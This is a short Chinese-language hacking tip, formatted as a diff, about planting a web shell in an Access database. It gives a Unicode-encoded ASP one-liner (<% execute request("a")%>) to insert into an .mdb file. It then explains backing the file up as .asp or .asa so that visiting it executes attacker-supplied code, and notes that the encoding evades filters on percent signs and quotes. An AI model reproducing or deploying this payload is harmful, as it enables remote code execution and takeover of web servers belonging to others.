@@ -1,0 +1,14 @@
+unicode编码的access木马 
+本方法适用于access数据库，只要在access数据库任何地方插入：
+
+┼攠數畣整爠煥敵瑳∨≡┩>
+
+然后将mdb备份成asp或者asa。
+
+访问这个asp或asa，就是一句话。
+
+注：上面那串乱码，是<% execute request("a")%>的unicode
+
+因为你直接插入< % execute request("a")%>，那么编码后没法执行。
+
+有些地方过滤了%号或引号，用unicode编码的access木马就可以绕过了。
